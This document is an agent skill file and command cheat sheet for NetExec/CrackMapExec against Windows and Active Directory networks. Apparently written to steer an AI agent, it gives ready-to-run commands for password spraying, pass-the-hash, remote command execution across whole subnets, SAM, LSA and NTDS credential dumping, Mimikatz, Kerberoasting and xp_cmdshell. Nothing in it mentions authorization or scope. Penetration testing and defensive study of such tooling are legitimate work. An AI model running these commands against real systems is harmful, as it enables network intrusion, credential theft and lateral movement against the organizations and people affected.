---
name: nxc-cme
description: "Use NetExec (nxc) / CrackMapExec (cme) for bulk operations across Windows/AD networks. Use when you need bulk credential validation, password spraying, remote command execution, share enumeration, or credential dumping. nxc is the successor to CrackMapExec and supports SMB/WinRM/LDAP/MSSQL/SSH/RDP/FTP/WMI. It is used in domain penetration for bulk operations — one command to validate credentials or execute commands across an entire network segment. Use this skill for scenarios involving CrackMapExec, NetExec, nxc, cme, password spraying, bulk SMB, and domain user enumeration"
zh-signals: "使用 NetExec/CrackMapExec 对 Windows/AD 进行凭据验证、密码喷洒与远程执行等批量操作。信号:nxc,cme,smb,密码喷洒,域渗透,横向移动"
when-to-use: >-
  Use when performing bulk credential validation, password spraying, remote command execution,
  share enumeration, or credential dumping across Windows/Active Directory networks with
  nxc or cme.
metadata:
  tags: "nxc,netexec,cme,crackmapexec,smb,winrm,ldap,password-spraying,credential,domain,lateral-movement,bulk,spray"
  category: "tool"
---

# NetExec (nxc) / CrackMapExec (cme)

nxc (NetExec) is the successor to CrackMapExec — the command syntax is almost identical, but nxc is more actively maintained. If only cme is available on the target machine, usage is the same; just replace `nxc` with `cme`.

Core value: **one command operates an entire network segment** — bulk credential validation, password spraying, remote execution, and information enumeration.

Project URLs:
- NetExec: https://github.com/Pennyw0rth/NetExec
- CrackMapExec: https://github.com/Porchetta-Industries/CrackMapExec

## Network Discovery and Output Interpretation

```bash
# Subnet scan to discover Windows hosts
nxc smb 10.0.0.0/24

# Specify a non-default port
nxc smb TARGET --port 4455

# Output field interpretation:
# SMB  10.0.0.1  445  DC01  [*]  Windows Server 2022  (name:DC01) (domain:corp.local) (signing:True) (SMBv1:False)
#                                                       ↑ hostname    ↑ domain           ↑ signing:True=DC/relay not possible  ↑ SMBv1 status
# signing:True  → domain controller or a host with enforced signing, NTLM relay is not possible
# signing:False → usable as an NTLM relay target

# Export the output
nxc smb 10.0.0.0/24 --export json /tmp/nxc_scan.json
nxc smb 10.0.0.0/24 | tee nxc_output.txt

# Auto-generate configuration files (fast setup in a domain environment)
nxc smb DC_IP --generate-hosts-file /etc/hosts       # generate the /etc/hosts mapping
nxc smb DC_IP --generate-krb5-file /etc/krb5.conf     # generate the Kerberos configuration

# RDP protocol probing
nxc rdp 10.0.0.0/24                                    # discover hosts with RDP open
nxc rdp TARGET -u user -p 'password'                   # RDP credential validation
```

## Credential Validation

```bash
# Password authentication
nxc smb 10.0.0.0/24 -u admin -p 'P@ssw0rd'

# NTLM pass-the-hash
nxc smb 10.0.0.0/24 -u admin -H NTLM_HASH

# Local administrator (no domain authentication)
nxc smb 10.0.0.0/24 -u administrator -p 'password' --local-auth

# In the output, [+] indicates successful authentication, (Pwn3d!) indicates administrative privileges
```

## Password Spraying

```bash
# One password against all users (safe, does not trigger lockouts)
nxc smb DC_IP -u users.txt -p 'Summer2024!' --continue-on-success

# Multi-password spraying (mind the lockout policy)
nxc smb DC_IP -u users.txt -p passwords.txt --continue-on-success --no-bruteforce

# WinRM protocol spraying
nxc winrm 10.0.0.0/24 -u admin -p 'password'
```

## Remote Command Execution

```bash
# Execute a command over SMB
nxc smb TARGET -u admin -p 'password' -x "whoami"
nxc smb TARGET -u admin -p 'password' -x "type C:\flag.txt"

# Execute over WinRM
nxc winrm TARGET -u admin -p 'password' -x "ipconfig"

# PowerShell execution
nxc smb TARGET -u admin -p 'password' -X "Get-Process"

# Bulk execution (the whole segment)
nxc smb 10.0.0.0/24 -u admin -p 'password' -x "hostname" --continue-on-success
```

## Information Enumeration

```bash
# SMB share enumeration
nxc smb TARGET -u user -p 'password' --shares

# User enumeration
nxc smb DC_IP -u user -p 'password' --users

# Group enumeration
nxc smb DC_IP -u user -p 'password' --groups

# Password policy
nxc smb DC_IP -u user -p 'password' --pass-pol

# Session enumeration (see who logged into which machine)
nxc smb 10.0.0.0/24 -u user -p 'password' --sessions

# Logged-on users
nxc smb 10.0.0.0/24 -u user -p 'password' --loggedon-users
```

## Credential Dumping

```bash
# SAM dump (local hashes)
nxc smb TARGET -u admin -p 'password' --sam

# LSA dump
nxc smb TARGET -u admin -p 'password' --lsa

# NTDS.dit dump (hashes of all domain users on a domain controller)
nxc smb DC_IP -u admin -p 'password' --ntds

# Crack with hashcat
nxc smb DC_IP -u admin -p 'password' --ntds | tee ntds_dump.txt
```

## LDAP Operations

```bash
# LDAP user enumeration
nxc ldap DC_IP -u user -p 'password' --users

# Find Kerberoastable accounts
nxc ldap DC_IP -u user -p 'password' --kerberoasting output.txt

# AS-REP Roasting
nxc ldap DC_IP -u user -p 'password' --asreproast output.txt

# Domain trust
nxc ldap DC_IP -u user -p 'password' --trusted-for-delegation
```

## MSSQL

```bash
# MSSQL credential validation
nxc mssql 10.0.0.0/24 -u sa -p 'password'

# Execute SQL
nxc mssql TARGET -u sa -p 'password' -q "SELECT name FROM master.dbo.sysdatabases"

# xp_cmdshell execution
nxc mssql TARGET -u sa -p 'password' -x "whoami"
```

## Module System

```bash
# List the available modules
nxc smb -L

# Use the Mimikatz module
nxc smb TARGET -u admin -p 'password' -M mimikatz

# Use the Spider module (search for sensitive files in shares)
nxc smb TARGET -u user -p 'password' -M spider_plus

# WebDAV detection
nxc smb TARGET -u user -p 'password' -M webdav
```

## Decision Tree

```
nxc vs impacket — which to choose?
├─ Bulk operations (a whole segment) → nxc (one command does it all)
├─ Deep single-target operations → impacket (more flexible)
├─ Password spraying → nxc (built-in --no-bruteforce)
├─ Credential dumping → either works (nxc --sam/--ntds or secretsdump)
├─ NTLM relay → impacket ntlmrelayx
└─ Kerberos attacks → impacket (more complete)
```
